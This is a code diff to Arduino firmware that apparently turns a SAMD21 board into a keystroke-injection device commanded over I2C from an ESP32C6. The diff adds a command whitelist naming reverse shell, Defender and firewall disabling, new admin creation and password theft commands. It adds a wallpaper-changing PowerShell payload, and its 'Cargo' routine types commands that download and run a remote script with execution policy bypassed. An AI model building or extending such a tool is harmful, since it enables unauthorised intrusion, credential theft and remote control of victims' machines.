@@ -6,7 +6,7 @@
 
 // Define constants
 const int I2C_MASTER_ADDR = 0x08; // I2C address of the ESP32C6 (C6 board)
-const int ledPin = 13;
+// Remove ledPin variable since we're using LED_BUILTIN
 
 const char *server = "ip_address";
 const char *port = "port";
@@ -20,12 +20,33 @@ const char *dns_server2 = "1.1.1.1";
 const char *admin_username = "admin_username";
 const char *admin_password = "admin_password";
 
+// Add this function BEFORE executeCommand function
+bool isValidCommandFormat(const String& command) {
+    // List of valid commands
+    const char* validCommands[] = {
+        "BGCHANGE", "RS", "FR", "DNS", 
+        "Wpass", "Ddefender", "Dfirewall", 
+        "NewAdmin", "Cargo", "None"
+    };
+    
+    const int numCommands = sizeof(validCommands) / sizeof(validCommands[0]);
+    
+    // Check if the command matches any valid command
+    for (int i = 0; i < numCommands; i++) {
+        if (command == validCommands[i]) {
+            return true;
+        }
+    }
+    return false;
+}
+
 void setup()
 {
   Wire.begin(I2C_MASTER_ADDR);  // Initialize I2C as slave
   Keyboard.begin();             // Initialize the Keyboard library
   Wire.onReceive(receiveEvent); // Register the receive event handler
   Serial.begin(115200);         // Initialize Serial for debugging
+  pinMode(LED_BUILTIN, OUTPUT); // Initialize built-in LED
   Serial.println("SAMD21 ready to receive commands over I2C");
 }
 
@@ -45,7 +66,29 @@ void receiveEvent(int bytes) {
 
 void executeCommand(String command)
 {
-  if (command == "RS")
+  // Add command validation before execution
+  if (!isValidCommandFormat(command)) {
+    return;
+  }
+
+  if (command == "BGCHANGE")
+  { // Change Desktop Background
+    openPowerShell();
+    Serial.println(command);
+    // Create a directory to store the wallpaper
+    Keyboard.println("New-Item -ItemType Directory -Force -Path \"C:\\Users\\Public\\Pictures\" | Out-Null");
+    // Download the image (replace URL with your image URL)
+    Keyboard.println("Invoke-WebRequest -Uri 'https://example.com/wallpaper.jpg' -OutFile 'C:\\Users\\Public\\Pictures\\wallpaper.jpg'");
+    // Set the wallpaper using SystemParametersInfo
+    String payload = "$code = @'\n";
+    payload += "[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]\n";
+    payload += "public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);\n";
+    payload += "'@\n";
+    payload += "$user32 = Add-Type -MemberDefinition $code -Name 'Wallpaper' -Namespace User32 -PassThru\n";
+    payload += "$user32::SystemParametersInfo(20,0,'C:\\Users\\Public\\Pictures\\wallpaper.jpg',3)";
+    Keyboard.println(payload);
+  }
+  else if (command == "RS")
   { // Reverse Shell
     openPowerShell();
     Serial.println(command);
@@ -102,7 +145,7 @@ void executeCommand(String command)
   else if (command == "Cargo") {
     openPowerShell();
     Keyboard.println("New-Item -ItemType Directory -Force -Path \"C:\\CARGO\" | Set-Location -PassThru");
-    Keyboard.println("echo \"{"URL": "api.example.com", "Port": "443", "esp_id": "your_esp_id_here", "delivery_key": "your_delivery_key_here", "encryption_password": "YourEncryptionPassword"}\" > cred");
+    Keyboard.println("echo {\"URL\": \"api.example.com\", \"Port\": \"443\", \"esp_id\": \"your_esp_id_here\", \"delivery_key\": \"your_delivery_key_here\", \"encryption_password\": \"YourEncryptionPassword\"} > cred");
     Keyboard.println("Invoke-WebRequest https://www.7-zip.org/a/7zr.exe -OutFile c:\\7zr.exe");
     Keyboard.println("Invoke-WebRequest https://github/cargo.ps1 -OutFile c:\\cargo.ps1");
     Keyboard.println("PowerShell.exe -ExecutionPolicy Bypass -File cargo.ps1");
@@ -132,10 +175,5 @@ void executeCommand(String command)
   // Add more commands as needed
 }
 
-// Response function (To be implemented):
-// void sendResponse(String response) {
-//   Wire.beginTransmission(I2C_MASTER_ADDR);
-//   Wire.write(response.c_str(), response.length());
-//   Wire.endTransmission();
-//   Serial.println("Sent response to ESP32C6: " + response);
-// }
+// Should implement response handling
+// The commented-out response function should be completed
